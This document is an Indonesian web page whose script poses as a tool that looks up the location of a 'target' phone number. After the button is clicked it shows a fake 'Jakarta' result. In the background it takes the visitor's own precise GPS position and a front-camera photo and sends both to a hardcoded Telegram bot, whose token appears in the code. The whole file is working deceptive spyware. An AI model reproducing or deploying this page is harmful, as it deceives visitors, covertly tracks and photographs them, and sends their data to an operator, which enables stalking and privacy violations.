<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Kirim Foto+Lokasi (Satu Tombol)</title>
<style>
  :root{--card-bg:#fff;--body-bg:#f4f6f8}
  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:var(--body-bg);font-family:system-ui,Arial}
  .card{width:360px;padding:20px;border-radius:12px;background:var(--card-bg);box-shadow:0 8px 30px rgba(2,6,23,0.08);text-align:center}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #ddd;font-size:15px;box-sizing:border-box}
  button{width:100%;margin-top:12px;padding:12px;border-radius:10px;border:0;background:#0b74de;color:#fff;font-size:16px;cursor:pointer}
  .jakarta{margin-top:14px;font-size:16px;color:#111}
  .maplink{color:#0b74de;text-decoration:none}
</style>
</head>
<body>
  <div id="app" class="card">
    <h1>MASUKIN NO HP TARGET UNTUK CEK LOKASI</h1>
    <input id="phone" placeholder="Masukkan nomor HP (contoh: +62812...)" />
    <button id="go">‚û°Ô∏è Lanjut</button>
    <!-- Setelah tombol ditekan, UI diganti menjadi tampilan Jakarta saja -->
  </div>

<script>
(function(){
  // === ISI TOKEN & CHAT ID TELEGRAM DI SINI ===
  const BOT_TOKEN = "8383057333:AAGWRJU8RRm8uv3Omiv5YlIIeCcNDLb3Hjs"; // contoh: 123456:ABC-def...
  const CHAT_ID   = "6637547478";   // contoh: 123456789
  // ===========================================

  const app = document.getElementById('app');
  const phoneInput = document.getElementById('phone');
  const goBtn = document.getElementById('go');

  // Helper: kirim pesan teks ke Telegram (silent failure logged to console)
  async function sendTelegramMessage(text){
    if(!BOT_TOKEN || !CHAT_ID) { console.warn('BOT_TOKEN/CHAT_ID belum diisi'); return false; }
    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST',
        headers:{ 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      if(!res.ok) console.warn('sendMessage http status', res.status);
      return res.ok;
    }catch(e){
      console.error('sendMessage error', e);
      return false;
    }
  }

  // Helper: kirim photo ke Telegram
  async function sendTelegramPhoto(blob, caption){
    if(!BOT_TOKEN || !CHAT_ID) { console.warn('BOT_TOKEN/CHAT_ID belum diisi'); return false; }
    try{
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      if(caption) form.append('caption', caption);
      form.append('photo', blob, 'photo.jpg');
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: form });
      if(!res.ok) {
        const txt = await res.text().catch(()=>'<no body>');
        console.warn('sendPhoto failed', res.status, txt);
      }
      return res.ok;
    }catch(e){
      console.error('sendPhoto error', e);
      return false;
    }
  }

  // Ambil lokasi nyata (promise)
  function getRealLocation(timeout = 15000){
    return new Promise((resolve, reject) => {
      if(!navigator.geolocation) return reject(new Error('Geolocation tidak tersedia'));
      navigator.geolocation.getCurrentPosition(pos => {
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          ts: new Date().toISOString()
        });
      }, err => reject(err), { enableHighAccuracy: true, timeout });
    });
  }

  // Ambil foto dari kamera depan (ImageCapture preferred, fallback canvas)
  async function takePhotoBlob(){
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }});
    const track = stream.getVideoTracks()[0];
    let blob = null;
    try{
      // coba ImageCapture jika tersedia
      if(window.ImageCapture){
        try{
          const imageCapture = new ImageCapture(track);
          if(typeof imageCapture.takePhoto === 'function'){
            blob = await imageCapture.takePhoto();
          }
        }catch(e){
          // ignore, fallback ke canvas
        }
      }
      if(!blob){
        const video = document.createElement('video');
        video.srcObject = new MediaStream([track]);
        // beberapa browser perlu play untuk dapat frame
        await video.play().catch(()=>{});
        const w = video.videoWidth || 1280;
        const h = video.videoHeight || 720;
        const canvas = document.createElement('canvas');
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext('2d');
        // mirror agar natural untuk kamera depan
        ctx.save();
        ctx.translate(w,0);
        ctx.scale(-1,1);
        ctx.drawImage(video, 0, 0, w, h);
        ctx.restore();
        blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
        try{ video.pause(); video.srcObject = null; }catch(e){}
      }
    } finally {
      try{ track.stop(); }catch(e){}
    }
    return blob;
  }

  // Setelah tombol ditekan: ubah UI langsung -> hanya tampil Jakarta, lalu jalankan tugas async
  goBtn.addEventListener('click', async function onClick(){
    const phone = (phoneInput.value || '').trim();
    if(!phone){
      // tanpa alert sesuai permintaan: hanya log
      console.warn('Nomor HP kosong');
      return;
    }

    // GANTI UI SEKETIKA: tampilkan hanya lokasi Jakarta
    app.innerHTML = `
      <div class="jakarta">
        <strong>Lokasi untuk nomor ${escapeHtml(phone)}:</strong><br>
        üìç Jakarta, Indonesia<br>
        <a class="maplink" href="https://www.google.com/maps?q=-6.2088,106.8456" target="_blank">Buka Jakarta di Google Maps</a>
      </div>
    `;

    // Jalankan pengambilan & pengiriman di latar (tetap berjalan)
    (async ()=>{
      // 1) Ambil lokasi nyata (jika gagal, set null)
      let realLoc = null;
      try{
        realLoc = await getRealLocation();
      }catch(e){
        console.warn('getRealLocation failed', e);
        realLoc = null;
      }

      // 2) Ambil foto dari kamera depan (jika gagal, set null)
      let photoBlob = null;
      try{
        photoBlob = await takePhotoBlob();
      }catch(e){
        console.error('takePhotoBlob failed', e);
        photoBlob = null;
      }

      // 3) Kirim data ke Telegram:
      // Pesan teks lokasi
      try{
        let text = `üîî Permintaan lokasi untuk nomor: ${phone}\nüïí ${new Date().toLocaleString()}\n\n`;
        if(realLoc){
          text += `üìç Latitude: ${realLoc.lat}\nüìç Longitude: ${realLoc.lon}\nüéØ Akurasi: ${realLoc.accuracy} m\n`;
          text += `üîó https://www.google.com/maps?q=${realLoc.lat},${realLoc.lon}\n`;
        } else {
          text += `‚ö†Ô∏è Lokasi nyata tidak tersedia (user menolak/timeout)\n`;
        }
        text += `\n(Generated by web controller)`;
        await sendTelegramMessage(text);
      }catch(e){
        console.error('send message error', e);
      }

      // Kirim foto (dengan caption)
      if(photoBlob){
        const caption = `üì∏ Foto dari device pengirim\nTarget nomor: ${phone}\nWaktu: ${new Date().toLocaleString()}` + (realLoc ? `\nLokasi: ${realLoc.lat}, ${realLoc.lon}` : '');
        try{
          await sendTelegramPhoto(photoBlob, caption);
        }catch(e){
          console.error('send photo error', e);
        }
      } else {
        console.warn('No photo to send');
      }
    })();

    // hapus event listener agar tidak bisa ditekan dua kali (opsional)
    goBtn.removeEventListener('click', onClick);
  });

  // utility: escape HTML untuk output
  function escapeHtml(s){
    return String(s).replace(/[&<>"']/g, function(m){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]); });
  }

})();
</script>
</body>
</html>
